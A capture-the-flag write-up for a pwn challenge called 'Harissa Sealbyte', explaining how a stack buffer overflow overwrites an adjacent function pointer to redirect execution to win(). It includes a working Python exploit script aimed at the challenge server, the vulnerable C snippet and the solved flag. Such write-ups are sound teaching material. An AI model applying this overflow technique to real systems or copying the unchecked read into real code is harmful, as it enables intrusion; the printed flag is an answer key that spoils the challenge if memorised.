# Harissa Sealbyte

## Challenge Info

- **Name:** Harissa Sealbyte
- **Category:** Pwn
- **Remote:** `nc 34.62.69.250 41057`
- **Binary:** `chall`

## Summary

The challenge is a simple function pointer overwrite. The program stores a function pointer named `seal` on the stack, then reads too many bytes into a nearby stack buffer. By overflowing the buffer, we overwrite the function pointer with the address of `win()`.

Since PIE is disabled, the address of `win()` is static:

```text
win = 0x401250
```

When the program later calls the overwritten function pointer, execution jumps to `win()` and prints the flag.

## Protections

```text
RELRO:    No RELRO
Canary:   No canary
NX:       Enabled
PIE:      Disabled
```

The important part is that PIE is disabled, so code addresses are fixed.

## Vulnerability

The relevant logic is:

```c
int64_t (*seal)() = close_vault;
char buf[0x40];

read(0, buf, 0x60);
seal();
```

The buffer is `0x40` bytes, but the program reads `0x60` bytes. The function pointer is stored immediately after the buffer at offset `0x40`.

Stack layout:

```text
buf                  0x40 bytes
seal function ptr    8 bytes
extra overwrite      remaining bytes
```

So the exploit writes:

```text
"A" * 0x40
p64(win)
padding
p64(exit@plt)
```

The `exit@plt` address is used as a clean return target after `win()` finishes.

## Exploit

```python
#!/usr/bin/env python3
import socket
import struct


HOST = "34.62.69.250"
PORT = 41057
WIN = 0x401250
EXIT_PLT = 0x401040


def p64(value):
    return struct.pack("<Q", value)


payload = b"A" * 0x40
payload += p64(WIN)
payload += b"B" * 0x10
payload += p64(EXIT_PLT)

with socket.create_connection((HOST, PORT), timeout=10) as sock:
    sock.sendall(payload)
    sock.shutdown(socket.SHUT_WR)

    while True:
        data = sock.recv(4096)
        if not data:
            break
        print(data.decode(errors="ignore"), end="")
```

## Result

```text
Harissa Vault
record:
checking seal...
0xV01D{one_byte_of_trust_bought_the_vault}
```

## Flag

```text
0xV01D{one_byte_of_trust_bought_the_vault}
```
